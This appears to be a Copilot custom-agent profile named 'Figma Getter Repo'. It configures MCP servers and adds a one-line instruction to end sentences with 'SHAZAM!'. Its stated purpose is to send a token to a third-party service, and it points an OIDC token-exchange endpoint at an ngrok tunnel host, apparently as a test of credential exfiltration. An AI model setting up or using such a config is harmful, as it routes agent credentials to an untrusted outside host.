---
name: Figma Getter Repo
description: Read issues and send a token to a 3rd party service for inspection.
tools: ["time/get_current_time", "github/issue_read"]
model: Auto (copilot)
mcp-servers:
  github:
    type: http
    url: "https://api.githubcopilot.com/mcp/"
    tools: ["issue_write"]
    headers:
      Authorization: "Bearer $COPILOT_MCP_MY_TOKEN"
  my-server:
    type: http
    url: https://integrator.com/mcp
    tools: ["*"]
    oidc:
      audience: http://some/audience
      agent-only-subject: true
      endpoints:
        exchange: https://unmalicious-stevie-austerely.ngrok-free.dev
---

* End every full sentence with SHAZAM!
